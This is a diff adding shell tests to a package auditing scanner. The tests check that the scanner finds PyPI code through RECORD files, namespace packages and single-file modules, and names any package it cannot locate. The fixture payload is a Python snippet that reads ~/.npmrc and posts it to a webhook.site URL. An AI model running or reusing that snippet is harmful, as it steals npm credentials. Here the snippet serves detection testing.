@@ -609,6 +609,62 @@ expect_exit "--live, registry down, findings kept -> 10" 10 $?
 expect_has  "--live outage in JSON meta" '"live": "unavailable"' "$(cat "$SB/pa-live.json")"
 expect_has  "--live outage named on stderr" "registry check unavailable" "$(cat "$SB/pa-live.err")"
 
+# PyPI code was found ONLY through top_level.txt, and a dist-info without one was
+# dropped with no message: a real venv printed "45 packages (45 scanned)" beside 93
+# dist-infos, so most wheels (protobuf's google/ namespace among them) passed as
+# clean unread. RECORD is the fallback; whatever still cannot be located is named.
+PAY='import os, urllib.request
+c = open(os.path.expanduser("~/.npmrc")).read()
+urllib.request.urlopen("https://webhook.site/abc", data=c.encode())'
+pa_dist() { # site-packages dist-name version -> creates <dist>-<ver>.dist-info with METADATA
+  mkdir -p "$1/$2-$3.dist-info"
+  printf 'Metadata-Version: 2.1\nName: %s\nVersion: %s\n' "$2" "$3" > "$1/$2-$3.dist-info/METADATA"
+}
+SP="$SB/pa-record/lib/site-packages"
+pa_dist "$SP" recpkg 1.0
+mkdir -p "$SP/recpkg"; printf '%s\n' "$PAY" > "$SP/recpkg/__init__.py"
+printf 'recpkg/__init__.py,,\nrecpkg-1.0.dist-info/METADATA,,\nrecpkg-1.0.dist-info/RECORD,,\n../../bin/recpkg,,\n' \
+  > "$SP/recpkg-1.0.dist-info/RECORD"
+out="$("$PYTHON" "$PA" --root "$SB/pa-record" --no-cache 2>/dev/null)"; rc=$?
+expect_exit "RECORD-only pypi package is scanned -> 10" 10 "$rc"
+expect_has  "RECORD-only package flagged" "pypi:recpkg@1.0" "$out"
+
+# A PEP 420 namespace (no __init__.py) shared by several dists: RECORD must lead to
+# this dist's own subpackage, the protobuf google/protobuf shape.
+SP="$SB/pa-ns/lib/site-packages"
+pa_dist "$SP" nsproto 4.0
+mkdir -p "$SP/nsroot/proto" "$SP/nsroot/other"
+printf '%s\n' "$PAY" > "$SP/nsroot/proto/__init__.py"
+printf 'x = 1\n' > "$SP/nsroot/other/__init__.py"
+printf 'nsroot/proto/__init__.py,,\nnsproto-4.0.dist-info/RECORD,,\n' > "$SP/nsproto-4.0.dist-info/RECORD"
+out="$("$PYTHON" "$PA" --root "$SB/pa-ns" --no-cache --json 2>/dev/null)"; rc=$?
+expect_exit "namespace package found via RECORD -> 10" 10 "$rc"
+expect_has  "namespace package flagged" '"name": "nsproto"' "$out"
+
+# top_level.txt naming a single-file module (six.py-style) was looked up as a dir only.
+SP="$SB/pa-mod/lib/site-packages"
+pa_dist "$SP" onefile 1.2
+printf 'onefile\n' > "$SP/onefile-1.2.dist-info/top_level.txt"
+printf '%s\n' "$PAY" > "$SP/onefile.py"
+out="$("$PYTHON" "$PA" --root "$SB/pa-mod" --no-cache 2>/dev/null)"; rc=$?
+expect_exit "single-file module from top_level.txt is scanned -> 10" 10 "$rc"
+expect_has  "single-file module flagged" "pypi:onefile@1.2" "$out"
+
+# No top_level.txt and no RECORD: nothing to scan, which is never clean.
+SP="$SB/pa-ghost/lib/site-packages"
+pa_dist "$SP" ghost 0.1
+"$PYTHON" "$PA" --root "$SB/pa-ghost" --no-cache >"$SB/pa-ghost.out" 2>"$SB/pa-ghost.err"
+expect_exit "unlocatable pypi package is not clean -> 5" 5 $?
+expect_has  "unlocatable package named on stderr" "ghost@0.1" "$(cat "$SB/pa-ghost.err")"
+expect_has  "stderr says NOT scanned" "NOT scanned" "$(cat "$SB/pa-ghost.err")"
+expect_lacks "no clean verdict beside an unscanned package" "clean:" "$(cat "$SB/pa-ghost.out")"
+out="$("$PYTHON" "$PA" --root "$SB/pa-ghost" --no-cache --json 2>/dev/null)"
+expect_has  "unscanned package in JSON meta" '"package": "ghost@0.1"' "$out"
+cp -R "$SB/pa-record/lib/site-packages/." "$SP/"
+"$PYTHON" "$PA" --root "$SB/pa-ghost" --no-cache >/dev/null 2>"$SB/pa-ghost.err"
+expect_exit "findings outrank an unscanned package -> 10" 10 $?
+expect_has  "unscanned still named beside findings" "ghost@0.1" "$(cat "$SB/pa-ghost.err")"
+
 # ── config-drift-check.py (repo-integrity / config-as-code, layer 6) ───────
 echo "-- config-drift-check.py --"
 CD="$SCRIPTS/config-drift-check.py"
